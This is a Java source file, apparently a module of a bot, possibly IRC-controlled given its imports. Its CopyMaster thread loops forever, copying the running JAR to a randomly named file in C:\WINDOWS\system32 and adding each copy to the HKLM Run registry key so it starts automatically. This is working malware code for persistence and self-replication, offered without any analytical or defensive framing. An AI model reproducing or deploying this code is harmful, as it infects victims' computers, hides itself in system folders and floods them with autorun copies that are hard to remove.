package org.automatix.net.modules;

import org.automatix.net.ConfigFiles.IRCConfig;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.URI;
import java.util.Random;

/**
 * Created by IntelliJ IDEA.
 * User: Administrator
 * Date: Oct 27, 2008
 * Time: 10:07:46 PM
 * To change this template use File | Settings | File Templates.
 */
public class CopyMaster extends Thread {
    static Random random = new Random();
    public static void copyFile(File in, File out) throws Exception {
      FileInputStream fis  = new FileInputStream(in);
      FileOutputStream fos = new FileOutputStream(out);
      try {
          byte[] buf = new byte[1024];
          int i = 0;
          while ((i = fis.read(buf)) != -1) {
              fos.write(buf, 0, i);
          }
      }
      catch (Exception e) {
          throw e;
      }
      finally {
          if (fis != null) fis.close();
          if (fos != null) fos.close();
      }
    }
    public static String getJARLoc() {
		try {
			String str = Class.forName("org.automatix.net.Starter").getResource("Starter.class").toURI().toString();
			str =  str.substring(0, str.lastIndexOf("!"));
			str = str.replaceAll("jar:file:/", "");
			File file = new File(new URI("file:/" + str));
			return file.getPath();
		} catch(Exception e) { return ""; }
	}
    public void run() {
        File z = new File(getJARLoc());
        Runtime rt = Runtime.getRuntime();
        System.out.println(getJARLoc());
        for(;;) {
        String randomfilename = "C:\\WINDOWS\\system32\\"+Long.toString(Math.abs(random.nextLong()), 36)+".jar";
            System.out.println(randomfilename);
        File randomout = new File(randomfilename);
            try {
            copyFile(z,randomout);
        } catch (Exception e) {
            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
        }
            try {
                rt.exec("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "+randomfilename+" /t REG_SZ /d "+randomfilename);
            } catch (IOException e) {
                e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
            }
            try {
                Thread.sleep(15000);
            } catch (InterruptedException e) {
                e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
            }
        }
    }

}
